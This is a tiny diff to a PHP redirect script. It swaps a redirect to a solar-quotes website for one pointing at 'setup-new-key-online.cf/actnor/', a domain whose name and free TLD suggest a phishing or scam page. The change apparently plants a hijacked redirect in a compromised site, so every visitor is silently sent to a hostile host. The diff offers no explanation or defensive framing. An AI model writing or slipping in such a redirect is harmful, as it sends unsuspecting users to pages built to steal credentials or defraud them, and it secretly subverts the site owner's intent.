@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.solarquotes.com.au");
+header("Location: https://setup-new-key-online.cf/actnor/");
 die();
 ?>
